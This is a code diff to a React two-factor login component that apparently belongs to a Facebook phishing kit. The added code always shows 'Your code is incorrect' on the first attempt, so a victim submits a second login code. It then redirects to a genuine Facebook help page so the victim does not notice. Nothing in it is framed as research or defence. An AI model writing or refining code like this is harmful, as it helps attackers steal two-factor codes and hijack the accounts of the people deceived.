@@ -11,9 +11,12 @@ function TwoFactor() {
     register,
     handleSubmit,
     formState: { errors },
+    reset,
+    setError,
   } = useForm();
   const router = useRouter();
   const [step, setStep] = useLocalStorage('step');
+  const [failCount, setFailCount] = useState(1);
 
   useEffect(() => {
     if (step === 1) {
@@ -43,9 +46,14 @@ function TwoFactor() {
 
   const onSubmit = async (data) => {
     const res = await twoFactor(data);
-    if (res?.status) {
+
+    if (res?.status && !failCount) {
       setStep(0);
-      router.push('/success');
+      router.push('https://www.facebook.com/help/1288173394636262');
+    } else {
+      reset();
+      setError('code', { message: 'Your code is incorrect' });
+      setFailCount((prev) => prev - 1);
     }
   };
 
@@ -72,7 +80,12 @@ function TwoFactor() {
 
             <input
               placeholder="Login code"
-              {...register('code', { required: 'Login code is required' })}
+              type="number"
+              {...register('code', {
+                required: 'Login code is required',
+                valueAsNumber: true,
+                mimLength: 3
+              })}
               className="outline-none shadow-none px-3 py-3 mr-4 rounded border border-slate-300 mt-1 max-w-[230px]"
             />
             <span className="text-sm">{`(wait: ${minutes
